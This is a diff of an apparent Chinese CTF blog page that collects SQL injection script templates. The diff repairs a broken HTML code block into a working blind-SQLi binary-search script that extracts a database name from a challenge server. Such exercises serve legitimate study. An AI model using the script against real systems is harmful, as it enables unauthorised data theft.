@@ -433,14 +433,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.1k
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    7 分
                 </div>
                 
 
@@ -458,16 +458,16 @@
             <div id="articleContent">
                 <p>每次做sql注入的题目都要自己重写一遍脚本很麻烦，其实写好框架换payload就可以了，在此记录一些可以套的模板</p>
 <h4 id="sql注入二分法：">sql注入二分法：</h4>
-<pre class=" language-language-python"><code class="language-language-python">import requests
+<pre><code>import requests
 s = requests.session()
-url = "http://b610204e-01f9-45af-85d8-bc935b33bc72.node3.buuoj.cn/index.php"
-flag = ""
+url = &quot;http://b610204e-01f9-45af-85d8-bc935b33bc72.node3.buuoj.cn/index.php&quot;
+flag = &quot;&quot;
 
 def exp(i,j):
-	payload = "1^(ascii(mid((select database()),{},1))>{})^1".format(i,j)
+	payload = &quot;1^(ascii(mid((select database()),{},1))&gt;{})^1&quot;.format(i,j)
 	data = dict(id=payload)
 	res = s.post(url=url,data=data)
-	if "Nu1L" in res.text:
+	if &quot;Nu1L&quot; in res.text:
 		return True
 	else:
 		return False
@@ -475,7 +475,16 @@ def exp(i,j):
 for i in range(1,100):
 	low = 32
 	high =127
-	while(low<=high): mid="(low+high)//2" if (exp(i,mid)): low="mid+1" else: high="mid-1" flag +="chr((low+high+1)//2)" print(flag) < code></=high):></code></pre>
+	mid = (low+high)//2
+	while(low&lt;=high):
+		if (exp(i,mid)):
+			low = mid+1 
+		else:
+			high = mid
+		mid = (low+high)//2
+	flag += chr(mid)
+	print(flag)
+</code></pre>
 <p>二分法会比普通的字符比较跑的更快一些，用的时候只要把payload和url还有判断条件改一改就好了。</p>
 <h4 id="sql注入-无列名注入">sql注入 无列名注入</h4>
 <pre class=" language-language-python"><code class="language-language-python">'''
